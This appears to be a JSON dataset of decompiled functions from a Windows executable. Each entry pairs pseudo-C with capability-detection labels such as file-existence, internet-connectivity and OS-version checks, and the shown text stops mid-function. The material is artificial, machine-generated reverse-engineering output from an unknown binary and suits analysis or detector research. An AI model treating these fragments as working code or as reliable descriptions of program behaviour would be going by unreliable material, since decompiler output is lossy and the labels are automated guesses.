{
    "00401c20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00401c20(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = param_1;\n    uStack20 = 0xfffffffe;\n    uStack24 = 0x401000;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    while( true ) {\n        iVar1 = *(param_1 + 0xc);\n        if ((iVar1 == -1) || (iVar1 == param_2)) break;\n        if (*(*(param_1 + 8) + 4 + iVar1 * 0xc) == 0) {\n            (**(*(param_1 + 8) + 8 + iVar1 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 222
    },
    "00401c9b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n\nuint fcn.00401c9b(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    *0x42b08c = param_1;\n    *0x42b090 = param_2;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        iStack8 = param_3;\n        *0x42b090 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar1 = *(param_2 + 8);\n        for (iVar2 = *(param_2 + 0xc); iVar2 != -1; iVar2 = *(iVar1 + iVar2 * 0xc)) {\n            if (*(iVar1 + 4 + iVar2 * 0xc) != 0) {\n                *0x42b030 = ***(param_2 + -4);\n                *0x42b038 = (*(param_2 + -4))[1];\n                puVar6 = **(param_2 + -4);\n                puVar7 = 0x42b03c;\n                for (iVar4 = 0x14; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar7 = puVar7 + 1;\n                }\n                *0x42b034 = 0x42b03c;\n                iVar1 = (**(iVar1 + 4 + iVar2 * 0xc))();\n                param_2 = *(puVar5 + 0xc);\n                if (iVar1 != 0) {\n                    if (iVar1 < 0) {\n                        return 0;\n                    }\n                    iVar1 = *(param_2 + 8);\n                    fcn.00401c7a(param_2);\n                    puVar5 = param_2 + 0x10;\n                    fcn.00401c20(param_2, iVar2);\n                    (**(iVar1 + 8 + iVar2 * 0xc))();\n                }\n            }\n            iVar1 = *(param_2 + 8);\n        }\n    }\n    else {\n        fcn.00401c20(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    *0x42b010 = 0xb;\n    iVar2 = func_0x004099f4(0xb, 0);\n    if (iVar2 == 0) {\n        *0x42b010 = 8;\n        iVar2 = func_0x004099f4(8, 0);\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    if (iVar2 == -1) {\n        if (*0x42b02c != NULL) {\n    // WARNING: Could not recover jumptable at 0x00401e0f. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar3 = (**0x42b02c)();\n            return uVar3;\n        }\n    }\n    else {\n        func_0x004099f4(*0x42b010, iVar2);\n        func_0x004099dc(*0x42b010);\n    }\n    return 1;\n}\n",
        "token_count": 825
    },
    "00401e9c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00401e9c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uStackY85008;\n    uchar auStackY85004 [84924];\n    \n    func_0x00409528();\n    iVar1 = func_0x004096b8();\n    if (iVar1 != -1) {\n        func_0x004096c4();\n        func_0x004095ec();\n        uVar2 = 0;\n        do {\n            iVar1 = fcn.0040203b(auStackY85004 + uVar2, 0x42a290, 1);\n            if (iVar1 != 0xffff) {\n                return 1;\n            }\n            uVar2 = uVar2 + 0x11;\n        } while (uVar2 < uStackY85008);\n    }\n    return 0;\n}\n",
        "token_count": 198
    },
    "0040441a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040441a(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = func_0x004096b8(arg_8h, 0x80000000, 3, 0, 3, 0x80, 0);\n    if (iVar1 == -1) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        var_4h = 0;\n    }\n    else {\n        iVar2 = func_0x004095c8(iVar1, 0);\n        var_4h = func_0x00409694(0x40, iVar2 + 0x10);\n        if (arg_ch == NULL) {\n            var_10h = &var_8h;\n        }\n        else {\n            var_10h = arg_ch;\n        }\n        func_0x004096c4(iVar1, var_4h, iVar2, var_10h, 0);\n        func_0x004095ec(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 282
    },
    "004044c5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004044c5(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = func_0x004096b8(arg_8h, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar1 == -1) {\n        uVar2 = 0;\n    }\n    else {\n        func_0x004096dc(iVar1, 0, 0, 2);\n        iVar3 = -1;\n        do {\n            iVar3 = iVar3 + 1;\n        } while (*(arg_ch + iVar3) != '\\0');\n        func_0x00409748(iVar1, arg_ch, iVar3, &var_4h, 0);\n        func_0x00409748(iVar1, 0x42e0f0, 2, &var_4h, 0);\n        func_0x004095ec(iVar1);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "00404566": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404566(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = func_0x004096b8(arg_8h, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar1 != -1) {\n        func_0x004096dc(iVar1, 0, 0, 2);\n        func_0x00409748(iVar1, arg_ch, arg_10h, &var_4h, 0);\n        func_0x004095ec(iVar1);\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 173
    },
    "00407bfc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bfc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = func_0x004096b8(arg_8h, 0x80000000, 3, 0, 3, 0x80, 0);\n    if (iVar1 != -1) {\n        uVar2 = func_0x004095c8(iVar1, 0);\n        func_0x004095ec(iVar1);\n        var_4h = 0;\n        var_ch = 4;\n        fcn.00401fd6(0x80000001, 0x42b43d, arg_10h, &var_4h, &var_ch, &var_10h);\n        if (var_4h < uVar2) {\n            var_8h = fcn.00406346(arg_8h, arg_ch, 0x42d954, 0x42d952, var_4h, 0);\n            if (var_8h != 0) {\n                fcn.00401f4e(0x80000001, 0x42b43d, arg_10h, &var_8h, 4, 4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "00401f4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f4e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = func_0x0040991c(arg_8h, arg_ch, 0, 0, 0, 0xf003f, 0, &var_4h, &var_8h);\n    if (iVar1 == 0) {\n        iVar1 = func_0x0040994c(var_4h, arg_10h, 0, arg_1ch, arg_14h, arg_18h);\n        func_0x00409928(var_4h);\n        if (iVar1 == 0) {\n            if (var_8h == 1) {\n                uVar2 = 2;\n            }\n            else {\n                uVar2 = 1;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 277
    },
    "0040203b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040203b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *0x42b474 = *0x42b474 + 1;\n    var_ch = 0;\n    var_8h = 0;\n    while( true ) {\n        uVar3 = 0xffffffff;\n        do {\n            uVar3 = uVar3 + 1;\n        } while (*(arg_8h + uVar3) != '\\0');\n        if (uVar3 <= var_8h) break;\n        var_4h = 0;\n        *0x42b474 = *0x42b474 + 1;\n        uVar3 = 0;\n        while( true ) {\n            uVar2 = 0xffffffff;\n            do {\n                uVar2 = uVar2 + 1;\n            } while (*(arg_ch + uVar2) != '\\0');\n            if (uVar2 <= uVar3) break;\n            if (*(arg_8h + var_8h + uVar3) == *(arg_ch + uVar3)) {\n                var_4h = var_4h + 1;\n            }\n            iVar1 = -1;\n            do {\n                iVar1 = iVar1 + 1;\n            } while (*(arg_ch + iVar1) != '\\0');\n            if ((var_4h == iVar1) && (var_ch = var_ch + 1,  var_ch == arg_10h)) {\n                return var_8h;\n            }\n            uVar3 = uVar3 + 1;\n        }\n        var_8h = var_8h + 1;\n    }\n    return 0xffff;\n}\n",
        "token_count": 435
    },
    "004020e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004020e9(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack65539 [65523];\n    \n    func_0x00409528();\n    *0x42b474 = *0x42b474 + 1;\n    uVar1 = 0xffffffff;\n    do {\n        uVar1 = uVar1 + 1;\n    } while (*(arg_8h + uVar1) != '\\0');\n    uVar2 = arg_ch;\n    if (arg_ch <= uVar1) {\n        for (; uVar2 < arg_10h; uVar2 = uVar2 + 1) {\n            auStack65539[uVar2 - arg_ch] = *(arg_8h + uVar2);\n        }\n        auStack65539[arg_10h - arg_ch] = 0;\n    }\n    return auStack65539;\n}\n",
        "token_count": 225
    },
    "00402322": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402322(int32_t **arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x42a39c != NULL) {\n        (**(**0x42a39c + 8))(*0x42a39c);\n    }\n    (**(*arg_8h[1] + 8))(arg_8h[1]);\n    (**(**arg_8h + 8))(*arg_8h);\n    func_0x00409488();\n    return;\n}\n",
        "token_count": 122
    },
    "00402435": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00402435(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t unaff_EDI;\n    uint *puVar3;\n    int32_t iStackY65576;\n    uchar auStackY65571 [65507];\n    uint uStackY64;\n    int32_t *piStackY60;\n    int32_t *apiStackY56 [4];\n    int32_t *var_20h;\n    uint var_18h;\n    code *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    func_0x00409528();\n    if (*0x42b47c != 0xffff) {\n        *0x42b478 = 0;\n    }\n    if (arg_ch != *0x42b478) {\n        *0x42b478 = arg_ch;\n        if (*0x42a39c != NULL) {\n            (**(**0x42a39c + 8))();\n            *0x42a39c = NULL;\n        }\n        var_10h = pe_overlay;\n        func_0x00409784();\n        var_20h = 0x42e0f3;\n        apiStackY56[3] = 0x4024cd;\n        iVar1 = fcn.0040203b(&stack0xfffeffdd, 0x42e0f3, 1);\n        if (iVar1 == 0xffff) {\n            *0x42a39c = NULL;\n        }\n        else {\n            var_20h = *(arg_8h + 4);\n            iVar1 = (**(*var_20h + 0x1c))();\n            if ((unaff_EDI != 0) && (iVar1 == 0)) {\n                var_8h = 0;\n                var_ch = unaff_EDI;\n                if (*0x42b47c != 0xffff) {\n                    *0x42b47c = *0x42b47c + 1;\n                    if (unaff_EDI < *0x42b47c) {\n                        *0x42b47c = 0;\n                    }\n                    var_8h = *0x42b47c;\n                }\n                do {\n                    apiStackY56[3] = 0x402559;\n                    func_0x00409988();\n                    var_20h = CONCAT22(var_20h._2_2_, 2);\n                    *0x42b47c = var_8h;\n                    puVar2 = &fcn.00402435::var_20h;\n                    puVar3 = &stack0xffffffc8;\n                    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n                        *puVar3 = *puVar2;\n                        puVar2 = puVar2 + 1;\n                        puVar3 = puVar3 + 1;\n                    }\n                    piStackY60 = *(arg_8h + 4);\n                    uStackY64 = 0x402590;\n                    iVar1 = (**(*piStackY60 + 0x20))();\n                    if (iVar1 == 0) {\n                        apiStackY56[3] = 0x42e1c0;\n                        apiStackY56[2] = var_10h;\n                        apiStackY56[1] = 0x4025b4;\n                        iVar1 = (***var_10h)();\n                        if (iVar1 == 0) {\n                            apiStackY56[3] = *0x42a39c;\n                            apiStackY56[2] = 0x4025d6;\n                            iVar1 = (**(**0x42a39c + 0x94))();\n                            if ((iVar1 == 0) && (*0x42b47c = 0xffff,  iStackY65576 == arg_ch)) {\n                                *0x42b47c = 0xffff;\n                                return;\n                            }\n                        }\n                    }\n                    if (*0x42a39c != NULL) {\n                        apiStackY56[3] = 0x402615;\n                        (**(**0x42a39c + 8))();\n                    }\n                    var_8h = var_8h + 1;\n                } while (var_8h < var_ch);\n                *0x42a39c = NULL;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1053
    },
    "0040263c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040263c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        if (*(arg_8h + iVar3) == '\\x04') {\n            if (iVar2 == 0) {\n                var_4h = 1;\n                iVar2 = iVar3;\n                goto code_r0x004026f5;\n            }\n            if (iVar3 - iVar2 == 0x11) {\n                cVar1 = *(iVar2 + 1 + arg_8h);\n                if ((cVar1 != '4') && (cVar1 != '5')) {\n                    var_4h = 0;\n                }\n                func_0x00409a00(0x42a290, iVar2 + 1 + arg_8h);\n                *0x42a2a0 = 0;\n                iVar2 = fcn.00401e9c();\n                if (iVar2 != 0) {\n                    var_4h = 0;\n                }\n                if (var_4h != 0) {\n                    *0x42b464 = *0x42a054;\n                }\n                goto code_r0x00402729;\n            }\n            var_4h = 0;\n            iVar2 = 0;\n        }\n        else {\ncode_r0x004026f5:\n            if (((iVar2 != 0) && (iVar2 != iVar3)) && (('9' < *(arg_8h + iVar3) || (*(arg_8h + iVar3) < '0')))) {\n                var_4h = 0;\n            }\n        }\n        iVar3 = iVar3 + 1;\n        if (*(arg_8h + iVar3) == '\\0') {\n            var_4h = 0;\ncode_r0x00402729:\n            if (var_4h == 0) {\n                var_8h = func_0x004096b8(0x419e00, 0x40000000, 0, 0, 4, 0, 0);\n                func_0x004096dc(var_8h, 0, 0, 2);\n                iVar2 = -1;\n                do {\n                    iVar2 = iVar2 + 1;\n                } while (*(arg_8h + iVar2) != '\\0');\n                func_0x00409748(var_8h, arg_8h, iVar2, &var_ch, 0);\n                func_0x00409748(var_8h, 0x42e0f0, 2, &var_ch, 0);\n                func_0x004095ec(var_8h);\n            }\n            else {\n                func_0x00409548(0x409930, arg_8h);\n            }\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 679
    },
    "004027b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004027b7(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    char acStackY131235 [65531];\n    uint uStackY65704;\n    int16_t iStackY65700;\n    int32_t iStackY65692;\n    ushort uStackY65684;\n    uint32_t uStackY65676;\n    int32_t *piStackY65664;\n    int32_t *piStackY65660;\n    int32_t iStackY65656;\n    ushort uStackY65652;\n    int32_t *piStackY65644;\n    ushort uStackY65636;\n    int32_t *piStackY65632;\n    uint32_t uStackY65628;\n    int32_t *piStackY65624;\n    uint32_t uStackY65620;\n    int32_t iStackY65616;\n    int32_t iStackY65612;\n    int16_t iStackY65606;\n    uint uStackY65604;\n    uchar auStackY65600 [8];\n    uint uStackY65592;\n    int32_t *piStackY65588;\n    int32_t *piStackY65584;\n    int32_t *piStackY65580;\n    int32_t *piStackY65576;\n    int32_t *piStackY65572;\n    int32_t *piStackY65568;\n    int32_t *piStackY65564;\n    int32_t *piStackY65560;\n    int32_t iStackY65556;\n    uint uStackY65552;\n    int32_t iStackY65548;\n    uint uStackY65543;\n    uint uStackY120;\n    int32_t *piStackY116;\n    int32_t *apiStackY112 [4];\n    int32_t *apiStack76 [4];\n    int32_t *piStack60;\n    int32_t *piStack56;\n    uint var_4h;\n    \n    func_0x00409528();\n    uStackY65543._0_1_ = '\\0';\n    uStackY65552 = func_0x00409494();\n    iVar2 = fcn.0040237c(&stack0xfffeffc0);\n    if (iVar2 == 0) {\n        return;\n    }\n    do {\n        do {\n            do {\n                func_0x00409988();\n                uStackY65592 = func_0x004097cc();\n                fcn.00402435(&stack0xfffeffc0, uStackY65592);\n            } while (*0x42a39c == NULL);\n            iVar2 = (**(**0x42a39c + 0x48))();\n        } while (iVar2 != 0);\n        iVar2 = (***piStackY65572)();\n        if (iVar2 == 0) {\n            iVar2 = (**(**0x42a39c + 0x78))();\n            if (iVar2 == 0) {\n                iStackY65548 = fcn.004022dc(uStackY65604, 0x41a050);\n                iStackY65548 = iStackY65548 + 1;\n                *0x42a054 = uStackY65592;\n                iVar2 = (**(**0x42a39c + 0x7c))();\n                if (iVar2 == 0) {\n                    if (iStackY65606 == 0) {\n                        iStackY65616 = 0x7e619c41;\n                        iVar2 = (**(*piStackY65576 + 0x5c))();\n                        if (iVar2 == 0) {\n                            iVar2 = (**(*piStackY65580 + 0x20))();\n                            if (iVar2 == 0) {\n                                piStackY65584 = NULL;\n                                piStackY65588 = NULL;\n                                if (iStackY65612 < 2) {\n                                    piStack56 = piStackY65576;\n                                    piStack60 = 0x402cc6;\n                                    iVar2 = (**(*piStackY65576 + 0x38))();\n                                    uVar3 = 0xf30ce208;\n                                    if (iVar2 == 0) {\ncode_r0x00402cd9:\n                                        uVar3 = uVar3 ^ 0x12f3;\n                                        piStack56 = piStackY65564;\n                                        piStack60 = 0x402cf2;\n                                        iVar2 = (**(*piStackY65564 + 0x24))();\n                                        if (iVar2 == 0) {\n                                            uVar3 = uVar3 - 0xd45;\n                                            iStackY65556 = 0;\n                                            piStack60 = iStackY65548;\n                                            apiStack76[3] = 0x41a050;\n                                            apiStack76[2] = &stack0xfffefff9;\n                                            apiStack76[1] = 0x402d21;\n                                            func_0x004099b8();\n                                            for (piStackY65560 = NULL; piStackY65560 < piStackY65568;\n                                                piStackY65560 = piStackY65560 + 1) {\n                                                piStack60 = NULL;\n                                                apiStack76[3] = 0x402d37;\n                                                func_0x00409988();\n                                                iStackY65656 = uVar3 * 0xcd2;\n                                                apiStack76[3] = piStackY65560;\n                                                apiStack76[2] = &stack0xfffefff9;\n                                                apiStack76[1] = 0x42e065;\n                                                apiStack76[0] = &stack0xfffefff9;\n                                                func_0x00409a00();\n                                                uStackY65652 = 2;\n                                                piStackY65644 = piStackY65560;\n                                                piStack60 = &stack0xfffeffa0;\n                                                puVar4 = &stack0xfffeff8c;\n                                                puVar5 = &stack0xffffffb4;\n                                                for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                                    *puVar5 = *puVar4;\n                                                    puVar4 = puVar4 + 1;\n                                                    puVar5 = puVar5 + 1;\n                                                }\n                                                puVar4 = &stack0xfffeff8c;\n                                                puVar5 = &stack0xffffffa4;\n                                                for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                                    *puVar5 = *puVar4;\n                                                    puVar4 = puVar4 + 1;\n                                                    puVar5 = puVar5 + 1;\n                                                }\n                                                apiStackY112[3] = 0x402db3;\n                                                iVar2 = (**(*piStackY65564 + 0x2c))();\n                                                uVar3 = 0;\n                                                if (iVar2 == 0) {\n                                                    piStackY65624 = NULL;\n                                                    piStack60 = &stack0xfffeffa8;\n                                                    apiStack76[3] = 0x42e180;\n                                                    apiStack76[2] = piStackY65632;\n                                                    apiStack76[1] = 0x402de9;\n                                                    iVar2 = (***piStackY65632)();\n                                                    uVar3 = 0x73a;\n                                                    if (iVar2 == 0) {\n                                                        apiStack76[1] = &stack0xfffeffa4;\n                                                        apiStack76[0] = piStackY65624;\n                                                        iVar2 = (**(*piStackY65624 + 0x6c))();\n                                                        if (iVar2 == 0) {\n                                                            for (uStackY65620 = 0; uStackY65620 < uStackY65628;\n                                                                uStackY65620 = uStackY65620 + 1) {\n                                                                func_0x00409988();\n                                                                uStackY65684 = 2;\n                                                                uStackY65676 = uStackY65620;\n                                                                puVar4 = &stack0xfffeff6c;\n                                                                puVar5 = &stack0xffffffa0;\n                                                                for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                                                    *puVar5 = *puVar4;\n                                                                    puVar4 = puVar4 + 1;\n                                                                    puVar5 = puVar5 + 1;\n                                                                }\n                                                                puVar4 = &stack0xfffeff6c;\n                                                                puVar5 = &stack0xffffff90;\n                                                                for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                                                    *puVar5 = *puVar4;\n                                                                    puVar4 = puVar4 + 1;\n                                                                    puVar5 = puVar5 + 1;\n                                                                }\n                                                                piStackY116 = piStackY65624;\n                                                                uStackY120 = 0x402e86;\n                                                                iVar2 = (**(*piStackY65624 + 0x74))();\n                                                                if (iVar2 == 0) {\n                                                                    piStackY65660 = NULL;\n                                                                    iVar2 = (***piStackY65664)();\n                                                                    if ((iVar2 == 0) && (piStackY65660 != NULL)) {\n                                                                        apiStackY112[3] = uStackY65552;\n                                                                        apiStackY112[2] = piStackY65660;\n                                                                        apiStackY112[1] = 0x402eef;\n                                                                        iVar2 = (**(*piStackY65660 + 0x20))();\n                                                                        if ((iVar2 == 0) &&\n                                                                           ((iStackY65700 == 8 && (iStackY65692 != 0))))\n                                                                        {\n                                                                            apiStackY112[3] = 0x402f2f;\n                                                                            fcn.004022dc(iStackY65692, &stack0xfffdff5d)\n                                                                            ;\n                                                                            if (acStackY131235[0] != '\\0') {\n                                                                                iStackY65556 = 1;\n                                                                                apiStackY112[3] = &stack0xfffefff9;\n                                                                                apiStackY112[2] = 0x42e05d;\n                                                                                apiStackY112[1] = &stack0xfffefff9;\n                                                                                apiStackY112[0] = 0x402f7e;\n                                                                                func_0x00409a00();\n                                                                                iStackY65548 = -1;\n                                                                                do {\n                                                                                    iVar2 = iStackY65548;\n                                                                                    iStackY65548 = iVar2 + 1;\n                                                                                } while ((&stack0xfffefffa)[iVar2] !=\n                                                                                         '\\0');\n                                                                                apiStackY112[3] =\n                                                                                     &stack0xfffefffa + iVar2;\n                                                                                apiStackY112[2] = 0x402fbd;\n                                                                                func_0x004099b8();\n                                                                                apiStackY112[3] = 0x42e058;\n                                                                                apiStackY112[2] = &stack0xfffefff9;\n                                                                                apiStackY112[1] = 0x402fda;\n                                                                                func_0x00409a00();\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                    uStackY65704 = 0;\n                                                                    (**(*piStackY65664 + 8))();\n                                                                }\n                                                            }\n                                                        }\n                                                        uVar3 = 0;\n                                                        (**(*piStackY65624 + 8))();\n                                                    }\n                                                    apiStack76[1] = piStackY65632;\n                                                    apiStack76[0] = 0x403037;\n                                                    (**(*piStackY65632 + 8))();\n                                                    uVar3 = uVar3 ^ 0x4ed6;\n                                                }\n                                            }\n                                            if (iStackY65556 == 0) {\n                                                uStackY65543._0_1_ = '\\0';\n                                            }\n                                        }\n                                        piStack60 = piStackY65564;\n                                        apiStack76[3] = 0x403071;\n                                        (**(*piStackY65564 + 8))();\ncode_r0x00403071:\n                                        if (piStackY65588 != NULL) {\n                                            piStack56 = 0x403086;\n                                            (**(*piStackY65588 + 8))();\n                                        }\n                                        uStackY65620 = uVar3 * 0x228e;\n                                        goto code_r0x00403095;\n                                    }\n                                }\n                                else {\n                                    uStackY65636 = 0x17;\n                                    uStackY65628 = 1;\n                                    piStack56 = &stack0xfffeff9c;\n                                    piStack60 = piStackY65580;\n                                    apiStack76[3] = 0x402c40;\n                                    (**(*piStackY65580 + 0x1c))();\n                                    apiStack76[3] = &stack0xfffeffd0;\n                                    apiStack76[2] = 0x42e190;\n                                    apiStack76[1] = piStackY65644;\n                                    apiStack76[0] = 0x402c62;\n                                    iVar2 = (***piStackY65644)();\n                                    if (iVar2 == 0) {\n                                        piStack56 = piStackY65584;\n                                        piStack60 = 0x402c83;\n                                        iVar2 = (**(*piStackY65584 + 0xd0))();\n                                        uVar3 = 0xf986716d;\n                                        if (iVar2 == 0) {\n                                            piStack56 = piStackY65588;\n                                            piStack60 = 0x402ca7;\n                                            iVar2 = (**(*piStackY65588 + 0x38))();\n                                            if (iVar2 == 0) goto code_r0x00402cd9;\n                                            goto code_r0x00403071;\n                                        }\ncode_r0x00403095:\n                                        if (piStackY65584 != NULL) {\n                                            piStack56 = 0x4030aa;\n                                            (**(*piStackY65584 + 8))();\n                                        }\n                                    }\n                                }\n                            }\n                            piStack56 = 0x4030b6;\n                            (**(*piStackY65580 + 8))();\n                        }\n                    }\n                    else if (uStackY65543 != '\\0') {\n                        piStack56 = 0x402927;\n                        uVar1 = fcn.0040203b(&stack0xfffefff9, 0x42e15e, 1);\n                        uStackY65620 = uStackY65620 & 0xffff | uVar1 << 0x10;\n                        piStackY65624 = 0xb62b7b94;\n                        if (uVar1 != 0xffff) {\n                            piStack56 = 0x40296e;\n                            func_0x004099b8();\n                            *((uStackY65620 >> 0x10) + 0x41a050) = 0;\n                            iStackY65616 = 0;\n                            if (*0x42b46c == 0) {\n                                piStack56 = 0x4029ab;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e0d5, 1);\n                                if (iVar2 != 0xffff) {\n                                    piStack56 = 0x4029c8;\n                                    iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e0ce, 1);\n                                    if (iVar2 != 0xffff) {\n                                        iStackY65616 = 1;\n                                    }\n                                }\n                                piStack56 = 0x4029ed;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e0c1, 1);\n                                if (iVar2 != 0xffff) {\n                                    piStack56 = 0x402a0a;\n                                    iVar2 = fcn.0040203b(&stack0xfffefff9, 0x42e0b9, 1);\n                                    if (iVar2 != 0xffff) {\n                                        iStackY65616 = 1;\n                                    }\n                                }\n                                piStack56 = 0x402a2f;\n                                iVar2 = fcn.0040203b(0x41a050, 0x42e0ad, 1);\n                                if (iVar2 != 0xffff) {\n          